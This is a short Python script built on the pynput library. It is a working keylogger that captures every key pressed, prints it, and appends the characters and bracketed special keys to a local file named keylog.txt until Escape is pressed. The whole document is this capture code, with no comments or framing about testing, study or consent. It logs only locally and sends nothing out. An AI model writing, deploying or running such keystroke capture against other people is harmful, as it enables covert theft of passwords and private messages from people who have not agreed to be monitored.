from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logkey:
        try:
            char = key.char
            if char: 
                logkey.write(char)
        except AttributeError:
            logkey.write(f"[{str(key)}]")

    if key == keyboard.Key.esc:
        return False  

if __name__ == '__main__':
    with keyboard.Listener(on_press=keypressed) as listener:
        listener.join()
